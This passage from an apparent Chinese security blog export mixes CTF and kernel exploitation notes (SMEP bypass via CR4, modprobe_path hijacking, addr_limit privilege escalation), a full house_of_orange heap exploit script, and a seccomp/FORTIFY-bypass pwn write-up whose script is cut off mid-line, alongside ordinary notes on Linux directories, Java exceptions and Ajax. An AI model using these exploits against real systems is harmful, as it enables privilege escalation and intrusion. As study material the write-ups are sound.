修改CR4寄存器bypass-smepsmep(Supervisor Mode Execution Protection)是内核的一种保护措施,作用是当CPU处于Ring 0模式时,执行用户空间代码会触发页错误,这个保护在ARM中被称为PXN.可以通过grep smep /proc/cpuinfo检测该保护是否开启. 系统根据CR4寄存器的值判断是否开启smep保护,当CR4寄存器的第20位是1时,保护开启;为0时关闭.而CR4寄存器是可以通过mov指令修改的. 123pop rdi;0x6f0retmov cr4, rdi 关闭smep后就可以使用常规的ret2usr攻击. Double FetchDouble Fetch从漏洞原理上属于条件竞争漏洞,是一种内核态与用户态之间的数据访问竞争. 一个典型的Double Fetch漏洞:一个用户态线程准备数据并通过系统调用进入内核,该数据在内核中有两次被取用,内核第一次取用数据进行安全检查,当检查通过后内核第二次取用数据进行实际处理.而在两次取用数据之间,另一个用户态线程可创造条件竞争,对已通过检查的用户态数据进行篡改,在真实使用时造成访问越界或缓冲区溢出. UAF内核态的堆管理机制不太一样,但原理类似.由于cred结构体是使用kmem_cache_alloc分配的,所以可以通过申请相同大小的内存获取cred从而篡改cred. modprobe_path当内核运行一个错误格式的文件的时候,会调用这个modprobe_path所指向的二进制文件.可以通过劫持这个指针来运行恶意文件. 12cat /proc/kallsyms | grep modprobe_path#root 创建目标可执行文件. 1234system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh");system("chmod +x /home/pwn/copy.sh");system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/w4rd3n");system("chmod +x /home/pwn/w4rd3n"); 劫持modprobe_path到可执行文件/home/pwn/copy.sh后就可以触发并获取flag. 12system("/home/pwn/w4rd3n");system("cat /home/pwn/flag"); thread_info-&gt;addr_limitthread_info-&gt;addr_limit用于限制用户态程序能访问的地址的最大值,如果把它修改成0xffffffffffffffff就可以利用pipe读写整个内存空间,包括内核空间. 12345678910int pipefd[2];//pipe(pipefd)初始化int kmemcpy(void *dest, void *src, size_t size) &#123; write(pipefd[1], src, size); read(pipefd[0], dest, size); return size;&#125;//如果是泄露内核数据的话,dest为内核地址,src为内核地址,同时要关闭smap.//如果是对内核数据进行写操作,dest为内核地址,src为用户态地址. thread_info位于内核栈顶部而且是THREAD_SIZE对齐的,THREAD_SIZE可以为4k,8k或者是16k,利用stack_addr &amp; (~(THREAD_SIZE - 1))就可以计算出thread_info的地址. 通过thread_info的地址可以拿到task_struct(thread_info-&gt;task)的地址,进一步获取task_struct-&gt;real_cred和task_struct-&gt;cred的地址,修改task_struct-&gt;real_cred一直到 fsuid字段为0,修改task_struct-&gt;cred为task_struct-&gt;real_cred从而提权. 在内核中set_fs是一个用于设置thread_info-&gt;addr_limit的宏,利用这个,再加上一些条件,可以直接修改thread_info-&gt;addr_limit. 总结可劫持的变量modprobe_path,通过执行错误格式的elf文件来触发. poweroff_cmd,执行__orderly_poweroff()即可. uevent_helper,ocfs2_hb_ctl_path,nfs_cache_getent_prog,cltrack_prog.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>kernel-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-house_of_orange]]></title>
    <url>%2Fposts%2F37c9d9ef%2F</url>
    <content type="text"><![CDATA[0x00house_of_orange利用环境. 没有free. 存在堆溢出或者其他可改写top_chunk大小的漏洞. 利用思路首先修改top_chunk的大小,如果malloc申请的堆块大小超过了top_chunk的大小,将调用sysmalloc来进行分配. sysmalloc针对这种情况有两种处理,如果申请大小大于等于mp_.mmap_threshold就直接调用mmap,否则就扩展top_chunk. 扩展top_chunk前有assert检测. 12345678old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);//无用assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0));assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 要求修改后的top_chunk_size必须满足如下条件. top_chunk_size &gt; MINSIZE.#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)). top_chunk需要有pre_in_use的标志(top_chunk &amp; 1 = 1). top_chunk的尾部要求页对齐(由于原top_chunk_size满足该条件,所以fake = real % 0x1000 + n * 0x1000). top_chunk_size小于申请分配的内存. 满足条件后就会继续往下执行,最后把old_top释放.这样就可以得到一个unsort_bin.再次malloc即可泄露libc,还可以通过large bin泄露heap. 劫持控制流使用的是File Stream Oriented Programming,触发函数是用于输出错误信息的malloc_printerr,malloc_printerr其实是调用__libc_message函数之后调用abort函数,abort函数其中调用了_IO_flush_all_lockp,所以只需要劫持IO_FILE_plus虚表中的这个函数即可. 通过unsortbin attack修改_IO_list_all为unsorted_chunks (av),这样_IO_list_all会将unsorted_chunks (av)处当作一个_IO_FILE结构体,调用_IO_flush_all_lockp时由于第一个_IO_FILE结构体可能不符合检测(_mode字段1/2几率通过),就会通过chain字段跳转到下一个IO_FILE_plus. 123456789101112131415161718192021222324252627282930313233// ./libio/genops.cint _IO_flush_all_lockp (int do_lock) &#123; /* code */ while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) //#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH),所以满足前两个就会发生调用. result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; &#125;#ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock (list_all_lock); __libc_cleanup_region_end (0);#endif return result;&#125; _IO_FILE结构体的chian字段(偏移为0x68)是bins的index为6的地方,也就是满足大小为0x70的chunk.只需要再次利用漏洞将unsorted bin大小改为0x70,同时满足以下检测即可劫持虚表. 123((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)||(_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))) hitcon-2016-house_of_orange payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *context.log_level = 'debug'def build(length, name, price, color): r.sendline("1") r.sendlineafter("Length of name :", str(length)) r.sendafter("Name :", name) r.sendlineafter("Price of Orange:", str(price)) r.sendlineafter("Color of Orange:", str(color)) r.recvuntil("Your choice : ")def upgrade(length, name, price, color): r.sendline("3") r.sendlineafter("Length of name :", str(length)) r.sendafter("Name:", name) r.sendlineafter("Price of Orange: ", str(price)) r.sendlineafter("Color of Orange: ", str(color)) r.recvuntil("Your choice : ")def see(): r.sendline("2") data = r.recvuntil("Your choice : ") return datar = process("./houseoforange")r.recvuntil("Your choice : ")build(0x100, "a" * 0x100, 0x100, 1)payload = "a" * 0x100 + p64(0) + p64(0x21) + p64(0x1f00000100) + p64(0) * 2 + p64(0xeb1)upgrade(0x1000, payload, 0x100, 1)build(0x1000, "b" * 0x1000, 0x1000, 2)#free(top_chunk)build(0x400, "c" * 0x8, 0x400, 3)libc = u64(see().split("c" * 0x8)[1][:6].ljust(8 , "\x00")) - 0x3c5188upgrade(0x1000, "c" * 0x10, 0x1000, 2)heap = u64(see().split("c" * 0x10)[1][:6].ljust(8 , "\x00")) - 0x1b0#leak heap and libcpayload = p64(libc + 0x3c5188) * 2 + p64(heap + 0x1b0) * 2payload = payload.ljust(0x400, "\x00")payload += p64(0) + p64(0x21) + p64(0x2000001000) + p64(0)fake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c5520 - 0x10)#3c5520 D _IO_list_all, fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(1) * 18 + p32(0x80000000) + "a" * 0x14#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2fake_chunk += p64(heap + 0x7e0)#fake_vtable_ptrfake_chunk = fake_chunk.ljust(0x200, "\x00")#fake_chunk &lt;=&gt; fake_IO_FILEpayload += fake_chunkpayload += p64(libc + 0x45390) * 0x10#fake_vtableupgrade(0x1000, payload, 0x1000, 3)r.sendline("1")#gdb.attach(r, "b genops.c:772")print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive()]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-Linux-文件与目录]]></title>
    <url>%2Fposts%2F11877a37%2F</url>
    <content type="text"><![CDATA[FHSFHS(Filesystem Hierarchy Standard)是一个标准,主要是关于如何规范Linux种软件与数据的存放. FHS依据文件系统使用的频繁与否和是否允许用户随意改动将目录定义成为四种交互作用的形态:可分享的/不可分享的,不变的/可变动的. 可分享的指能够分享给网络上其他主机挂载的目录,不可分享就是不能,即是否允许用户随意改动. 不变可变主要依据文件系统使用的频繁. FHS针对目录树架构仅定义出三层目录下面应该放置什么数据. /(根目录):与开机系统有关. /usr(UNIX software resource):与软件安装/执行有关. /var(variable):与系统运作过程有关. 根目录(/)所有的目录都是由根目录衍生而来,同时根目录也与开机,还原,系统修复等操作有关./所在分区越小越好,同时应用程序最好也不要存放在这个分区. FHS定义了/下面应该存在的子目录. /bin:放置单用户维护模式还能被使用的命令,即可以被root与一般用户使用. /boot:放置开机使用到的文件,包括Linux内核文件(vmlinuz),开机菜单和开机配置文件等,如果使用grub(引导装载程序)则会还存在/boot/grub. /dev:任意设备与接口设备都以文件的形式存在这个目录,通过访问该目录下的文件可以访问设备. /etc:放置系统的主要配置文件,如:帐号文件和密码文件.其中还有几个重要的子目录:/etc/init.d/存放服务的默认启动脚本./etc/xinetd.d/是super daemon管理的各项服务的配置文件目录. /home:用户主文件夹. /lib:放置开机时会用到的动态库,以及/bin和/sbin下命令会调用的动态库.其中/lib/modules/存放内核相关的模块. /media:放置可删除的设备,如:DVD,软盘,光盘等设备. /mnt:早期的设定与/media目录一样,现在用于暂时挂载设备. /opt:放置第三方软件.(以前的Linux系统种习惯放置在/usr/local目录下) /root:root的主文件夹. /sbin:放置开机过程所需要的命令,如开机,修复,还原系统所需要的命令.服务器软件程序一般放置/usr/sbin/,本机自行安装的软件产生的系统执行文件放置到/usr/local/sbin/. /srv:放置网络服务所需要的数据. /tmp:让一般用户或正在执行的程序放置临时文件的地方. Linux中还有一些比较重要的目录. /lost+found:当使用标准的ext2/3文件系统格式时会有,当文件系统发送错误会将一些丢失的片段放置在这里. /proc:这个目录本身就是一个虚拟文件系统,数据存在内存中,放置系统内核,进程,外部设备的状态及网络信息等. /sys:同上是以恶搞虚拟文件系统,数据也存在内存中,也就是不占用硬盘,用于记录与内核有关的信息. 开机过程中仅有根目录所在分区会挂载,其他分区在开机完成后才会挂载.所以以下目录必须与根目录在同一分区:etc,bin,dev,lib,sbin. proc/proc中存储的是当前内核运行状态的一系列特殊文件(被称作虚拟文件),可以通过这些文件查看有关系统硬件及当前正在运行进程的信息,甚至可以通过更改其中某些文件来改变内核的运行状态. /proc/pid/proc目录中包含许多以数字命名的子目录,这些数字表示系统当前正在运行进程的进程号,里面包含对应进程相关的多个信息文件. cmdline:启动当前进程的完整命令,僵尸进程目录中的此文件不包含任何信息. cwd:指向当前进程运行目录的一个符号链接. environ:当前进程的环境变量列表,彼此间用空字符隔开. exe:指向启动当前进程的可执行文件的符号链接,通过/proc/pid/exe可以启动当前进程的一个拷贝. fd:这是个目录,包含当前进程打开的每一个文件的文件描述符,这些文件描述符是指向实际文件的一个符号链接. limits:当前进程所使用的每一个受限资源的软限制,硬限制和管理单元;此文件仅可由实际启动当前进程的UID用户读取. maps:当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表. mem:当前进程所占用的内存空间,由open,read和lseek等系统调用使用,不能被用户读取. root:指向当前进程运行根目录的符号链接;在Unix和Linux系统上,通常采用chroot命令使每个进程运行于独立的根目录. stat:当前进程的状态信息,包含一系统格式化后的数据列,可读性差,通常由ps命令使用. statm:前进程占用内存的状态信息,通常以页面page表示. status:与stat所提供信息类似,但可读性较好. task:目录文件,包含由当前进程所运行的每一个线程的相关信息,每个线程的相关信息文件均保存在一个由线程号tid命名的目录中,这类似于其内容类似于每个进程目录中的内容. /proc目录下常见文件 /proc/apm:高级电源管理APM版本信息及电池相关状态信息,通常由apm命令使用. /proc/buddyinfo:用于诊断内存碎片问题的相关信息文件. /proc/cmdline:在启动时传递至内核的相关参数信息,这些信息通常由lilo或grub等启动管理工具进行传递. /proc/cpuinfo:处理器的相关信息的文件. /proc/crypto:系统上已安装的内核使用的密码算法及每个算法的详细信息列表. /proc/devices:系统已经加载的所有块设备和字符设备的信息,包含主设备号和设备组(与主设备号对应的设备类型)名. /proc/diskstats:每块磁盘设备的磁盘I/O统计信息列表. /proc/dma:每个正在使用且注册的ISA DMA通道的信息列表. /proc/execdomains:内核当前支持的执行域信息列表. /proc/fb:帧缓冲设备列表文件,包含帧缓冲设备的设备号和相关驱动信息. /proc/filesystems:当前被内核支持的文件系统类型列表文件,被标示为nodev的文件系统表示不需要块设备的支持;通常mount一个设备时,如果没有指定文件系统类型将通过此文件来决定其所需文件系统的类型. /proc/interrupts:X86或X86_64体系架构系统上每个IRQ相关的中断号列表;多路处理器平台上每个CPU对于每个I/O设备均有自己的中断号. /proc/iomem:每个物理设备上的记忆体(RAM或者ROM)在系统内存中的映射信息. /proc/ioports:当前正在使用且已经注册过的与物理设备进行通讯的输入输出端口范围信息列表. /proc/kallsyms:模块管理工具用来动态链接或绑定可装载模块的符号定义,由内核输出. /proc/kcore:系统使用的物理内存,以ELF核心文件格式存储,其文件大小为已使用的物理内存加上4KB.这个文件用来检查内核数据结构的当前状态,通常由gdb等调试工具使用,不能使用文件查看命令打开此文件. /proc/kmsg:用来保存由内核输出的信息,通常由/sbin/klogd或/bin/dmsg等程序使用,不要试图使用查看命令打开此文件. /proc/loadavg:保存关于CPU和磁盘I/O的负载平均值. /proc/locks:保存当前由内核锁定的文件的相关信息,包含内核内部的调试数据,每个锁定占据一行,且具有一个惟一的编号. /proc/mdstat:保存RAID相关的多块磁盘的当前状态信息. /proc/meminfo:系统中关于当前内存的利用状况等的信息,常由free命令使用. /proc/mounts:在内核2.4.29版本以前,此文件的内容为系统当前挂载的所有文件系统,在2.4.19以后的内核中引进了每个进程使用独立挂载名称空间,此文件变成了指向/proc/self/mounts(每个进程自身挂载名称空间中的所有挂载点列表)文件的符号链接. /proc/modules:当前装入内核的所有模块名称列表,可以由lsmod命令使用. /proc/partitions:块设备每个分区的主设备号(major)和次设备号(minor)等信息,同时包括每个分区所包含的块(block)数目. /proc/pci:内核初始化时发现的所有PCI设备及其配置信息列表,其配置信息多为某PCI设备相关IRQ信息.可以用/sbin/lspci –vb命令获得较易理解的相关信息.在2.6内核以后此文件已被/proc/bus/pci目录及其下的文件代替. /proc/slabinfo:在内核中频繁使用的对象(如inode,dentry等)都有自己的cache,即slab pool,而/proc/slabinfo文件列出了这些对象相关slap的信息. /proc/stat:实时追踪自系统上次启动以来的多种统计信息. /proc/swaps:当前系统上的交换分区及其空间利用信息,如果有多个交换分区的话,则会每个交换分区的信息分别存储于/proc/swap目录中的单独文件中,而其优先级数字越低,被使用到的可能性越大. /proc/uptime:系统上次启动以来的运行时间. /proc/version:当前系统运行的内核版本号. /proc/vmstat:当前系统虚拟内存的多种统计数据. /proc/zoneinfo:内存区域zone的详细信息列表. /proc/sys:与/proc下其它文件的只读属性不同的是,root可对/proc/sys子目录中的许多文件内容进行修改以更改内核的运行特性,需要注意的是,即使文件可写,其一般也不可以使用编辑器进行编辑./proc/sys/debug子目录通常是一空目录./proc/sys/dev子目录为系统上特殊设备提供参数信息文件的目录,其不同设备的信息文件分别存储于不同的子目录中.如/proc/sys/dev/cdrom和/proc/sys/dev/raid(如果内核编译时开启了支持raid的功能)目录,其内存储的通常是系统上cdrom和raid的相关参数信息文件. usr/usr目录的数据是属于可分享且不可变动的,一般会占用较大的硬盘容量. FHS定义了/usr下面应该存在的子目录. /usr/X11R6:放置X Window系统的重要数据. /usr/bin:放置着绝大部分的用户可使用命令. /usr/include:放置C/C++等程序语言的头文件. /usr/lib:放置各应用软件动态库,目标文件以及不被一般用户惯用的执行文件或脚本. /usr/local:用于放置系统管理员自己安装的软件,该目录下具有bin,etc等子目录. /usr/sbin:非系统正常运行所需要的系统命令,如某些网络服务器软件的服务命令. /usr/share:放置共享文件的地方. /usr/src:放置源码. var/usr目录的数据是属于可变动的,包括缓存,登陆文件以及某些软件运行所产生的文件. 常见子目录如下. /var/cache:应用程序本身运行过程中会产生的一些暂存文件. /var/lib:放置程序本身执行过程中需要使用的数据文件,该目录下各程序都有自己的子目录. /var/lock:放置锁. /var/log:放置登陆文件. /var/mail:放置个人电子邮件信箱的目录,与/var/spool/mail互为连接文件. /var/run:放置某些程序或服务启动后的PID. /var/spool:放置一些队列数据. 目录与路径]]></content>
      <categories>
        <category>CS</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-java-异常与断言]]></title>
    <url>%2Fposts%2Fe7a00dbf%2F</url>
    <content type="text"><![CDATA[异常处理Java的异常处理与C++的十分类似,都是由发生错误的方法抛出异常,然后异常处理机制捕获异常并使用对应的异常处理器处理异常. 异常分类在Java中异常对象都是派生于Throwable类的实例,同时支持创建自己的异常类. 所有异常都是由Throwable继承而来,Throwable有两个子类:Error和Exception. Error类及其派生类描述了Java运行时系统的内部错误和资源耗尽错误.应用程序不应该抛出这种错误. Exception又分两种:RuntimeException和其他异常.前者及其派生类用于描述程序错误导致的异常,后者及其派生类描述如IO错误导致的异常(即不属于Error和Exception范围的,也称为受查异常). 程序开发者导致的问题都属于RuntimeException负责的范围,也就是说自己创建的类应该派生于Exception或其子类.同时异常类应该包含两个构造器,一个无参的默认构造器,一个带有描述信息的构造器. 123456class MyException extends IOException &#123; public MyException() &#123;&#125; public MyException(String gripe) &#123; super(gripe); &#125;&#125; 编译器将核查是否所有受查异常都提供了异常处理器. 声明并抛出受查异常方法需要告诉编译器所有可能抛出的受查异常,子类方法中声明的受查异常不能比超类方法中的更通用. 123456public FileInputStream(String name) throws FileNotFoundException, EOFException &#123; //.. if (b &lt; len) &#123; throw new EOFException(); &#125;&#125; 捕获异常如果抛出的异常未被捕获则程序会终止执行并打印异常信息,包括异常的类型和堆栈内容(图形化程序捕获异常后也会打印堆栈信息). Java中通过try/catch语句块捕获异常. 1234567891011121314try &#123; //code&#125; catch (EOFException e) &#123; //code&#125; catch (MyException e) &#123; //可捕获多种异常 //code&#125; catch (MyException1 | MyException2 e) &#123; //Java SE 7后支持,区别在于这样两种异常共用一个异常处理块 //code&#125; finally &#123; //无论try语句中是否发生异常(即使try中已经返回)都会执行finally中的语句,常用于回收资源 //code&#125; 如果异常类型不对未被捕获,则函数会终止并返回(控制权交给调用者函数,看调用者函数是否处理该种异常).异常处理代码中可再次抛出异常. 断言断言机制允许在测试期间在代码中插入一些检查语句,当代码发布时这些语句会被自动移走. 1234assert x &gt;= 0;//assert 条件;assert x &gt;= 0 : x;//assert 条件 : 表达式; 如果条件判断为false则会抛出一个AssertionError异常,若有表达式则表达式会被传入AssertionError的构造器. 断言机制默认关闭,通过运行时-ea或-enableassertions选项来对某个类或包启用该机制,-da/-disableassertions选项来对某个类或包禁用该机制(对于系统类使用-esa/-dsa选项). 1java -ea Sample]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-FrontEnd-Ajax]]></title>
    <url>%2Fposts%2Fdfa99733%2F</url>
    <content type="text"><![CDATA[概览Ajax指异步的JavaScript和XML,是对构建动态Web应用程序所必备技术的一个统称,由JavaScript与CSS,XML,DOM加上XMLHttpRequest. XMLHttpRequestAjax的实现主要依赖XMLHttpRequest对象,该对象也是Ajax的核心. 获取XMLHttpRequest对象. 1234567891011121314151617var request = false;if(window.XMLHttpRequest) &#123; request = new XMLHttpRequest(); if(request.overrideMimeType) &#123; request.overrideMimeType('text/xml'); &#125;&#125;else if(window.ActiveXObject) &#123; var versions = ['Microsoft.XMLHTTP','MSXML.XMLHTTP','Microsoft.XMLHTTP'];//... for(var i = 0;i &lt; versions.length;i++) &#123; try &#123; request = new ActiveXObject(versions[i]); &#125; catch(e) &#123;&#125; &#125;&#125;xmlhttp = request; XMLHttpRequest对象的方法. abort():终止当前的请求. getAllResponseHeaders():把HTTP请求的所有相应首部作为键值对返回. getResponseHeader(&quot;header&quot;):把HTTP请求的指定首部的值返回. open(&quot;method&quot;, &quot;url&quot;[, async, username, password]):建立对服务器的调用. send(content):向服务器发送请求. setRequestHeader(&quot;header&quot;, &quot;value&quot;):设置首部属性,必须先调用open()方法. XMLHttpRequest对象的属性. onreadystatechange:每个状态改变都会触发,是一个函数. responseText:文本格式的响应. readyState:请求的状态,0表示未初始化的请求,1表示打开的请求,2表示已发出的请求,3表示正在接收的响应,4表示响应加载完毕. responseXML:XML格式的响应. status:服务器的HTTP状态,比如200,404等. statusText:HTTP状态对应的文本. HTTP通信发送GET/POST请求. 123456789xmlhttp.open("GET", url);xmlhttp.send();//GETxmlhttp.open("POST", url);xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencode")param = "id=1&amp;user=admin";xmlhttp.send(param);//POST 读取HTTP响应. 1234567xmlhttp.open("GET", url);xmlhttp.onreadystatechange = function() &#123; if(xmlhttp.readyState == 4) &#123; console.log(xml.responseText); &#125;&#125;;xmlhttp.send();]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-中国技能大赛-pwn2]]></title>
    <url>%2Fposts%2F335e0730%2F</url>
    <content type="text"><![CDATA[漏洞程序add中存在格式化字符串漏洞,但是由于开了FORTIFY,无法使用%n写,又因为输出流是stderr,无法泄露. 函数build无用,free操作无漏洞.发现set函数中使用了prctl函数,且存在edit函数修改规则对应的数据.参考secretcenter. seccompseccomp是在内核中实现的对于用户系统调用及其参数的过滤,决定是否继续调用此系统调用.(工具seccomp-tools) prctl函数在这里实际上就是设置对应的规则,其中rule可控,也就是说可以控制其规则. 1234prctl(38, 1LL, 0LL, 0LL, 0LL);v1 = 11;v2 = rule;prctl(22, 2LL, &amp;v1, *(_QWORD *)&amp;v1, rule); 使用seccomp-tools分析原规则. 123456789101112131415161718192021222324252627282930seccomp-tools dump ./pwnThis is an easy pwn.Enjoy it1.add2.delete3.build4.set5.exitYour choice : 31.add2.delete3.build4.set5.exitYour choice : 4 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0010 0004: 0x15 0x05 0x00 0x00000039 if (A == fork) goto 0010 0005: 0x15 0x04 0x00 0x0000003b if (A == execve) goto 0010 0006: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0010 0007: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0010 0008: 0x15 0x01 0x00 0x00000130 if (A == open_by_handle_at) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL fprintf_chkfprintf_chk执行%n会报错. 1*** %n in writable segment detected *** 检测逻辑(glibc2.23). 123456789LABEL (form_number): if (s-&gt;_flags2 &amp; _IO_FLAGS2_FORTIFY) &#123; if (! readonly_format) &#123; extern int __readonly_area (const void *, size_t) attribute_hidden; readonly_format = __readonly_area (format, ((STR_LEN (format) + 1) * sizeof (CHAR_T))); &#125; if (readonly_format &lt; 0) __libc_fatal ("*** %n in writable segment detected ***\n"); &#125; __readonly_area通过fopen打开/proc/self/maps,来判断format是否是只读段. 结构体__IO_FILE利用_fileno来判定是哪个文件. 12345678910111213141516171819202122232425_IO_FILE * _IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot, int read_write, int is32not64) &#123; int fdesc;#ifdef _LIBC if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL)) fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot); else fdesc = open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);#else fdesc = open (filename, posix_mode, prot);#endif if (fdesc &lt; 0) return NULL; fp-&gt;_fileno = fdesc; _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING); if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS)) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end); if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE) &#123; close_not_cancel (fdesc); return NULL; &#125; &#125; _IO_link_in ((struct _IO_FILE_plus *) fp); return fp;&#125;libc_hidden_def (_IO_file_open) 而stdin._fileno = 0,所以可以控制seccomp让fopen(&quot;/proc/self/maps&quot;)返回ERROR,此时,open的返回值为0,此时fopen认为其fileno是0,程序会从STDIN中读取数据,进行判断. 此时只需要输入000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n即可绕过%n检测. 规则构造这里直接套用大师傅的. 12345678910111213A = archA == ARCH_X86_64 ? next : deadA = sys_numberA == close ? dead : nextA == exit_group ? dead : nextA == open ? next : allowA = args[0]A &amp;= 0xffA == 0x7c ? dead : nextallow:return ALLOWdead:return ERRNO(0) 利用seccomp-tools生成规则. 1234567891011121314seccomp-tools asm rule.asm -a amd64 -f raw | seccomp-tools disasm - line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0010 0004: 0x15 0x05 0x00 0x000000e7 if (A == exit_group) goto 0010 0005: 0x15 0x00 0x03 0x00000002 if (A != open) goto 0009 0006: 0x20 0x00 0x00 0x00000010 A = args[0] 0007: 0x54 0x00 0x00 0x000000ff A &amp;= 0xff 0008: 0x15 0x01 0x00 0x0000007c if (A == 124) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00050000 return ERRNO(0) 利用利用就很常规了,got表可写. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *context.log_level = "debug"def add(size, content): r.sendline('1') r.sendlineafter('input the size', str(size)) r.sendafter('input your content: ', content) data = r.recvuntil('Your choice : \n') return datadef delete(): r.sendline('2') r.recvuntil('Your choice : \n')def sets(): r.sendline('4') r.recvuntil('Your choice : \n')def edit(size, content): r.sendline('666') r.sendlineafter('input yout choice: \n', str(1)) r.sendlineafter('input the size\n', str(size)) r.sendafter('input your content\n', content) r.recvuntil('Your choice : \n')def rule(code, jt ,jf ,k): return p16(code) + p8(jt) + p8(jf) + p32(k)def build_rule(): payload = '' payload += rule(0x20, 0x00, 0x00, 0x00000004) # A = arch payload += rule(0x15, 0x00, 0x08, 0xc000003e) # if (A != ARCH_X86_64) goto 0010 payload += rule(0x20, 0x00, 0x00, 0x00000000) # A = sys_number payload += rule(0x15, 0x06, 0x00, 0x00000003) # if (A == close) goto 0010 payload += rule(0x15, 0x05, 0x00, 0x000000e7) # if (A == exit_group) goto 0010 payload += rule(0x15, 0x00, 0x03, 0x00000002) # if (A != open) goto 0009 payload += rule(0x20, 0x00, 0x00, 0x00000010) # A = args[0] payload += rule(0x54, 0x00, 0x00, 0x000000ff) # A &amp;= 0xff payload += rule(0x15, 0x01, 0x00, 0x0000007c) # if (A == 124) goto 0010 payload += rule(0x06, 0x00, 0x00, 0x7fff0000) # return ALLOW payload += rule(0x06, 0x00, 0x00, 0x00050000) # return ERRNO(2) return payloadr = process("./pwn")#r = remote("192.168.100.102", "50002")r.recvuntil('Your choice : \n')new_rule = build_rule()edit(len(new_rule), new_rule)sets()#gdb.attach(r, "b __fprintf_chk\nc")r.sendline('1')r.sendlineafter('input the size', str(0x30))r.sendafter('input your content: ', "%16p%16p%16p%ln")sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil("[heap]\n")libc = int(r.recvuntil("-")[:-1], 16)r.recvuntil('Your choice : \n')system = libc + 0x45390r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%" + str((system % 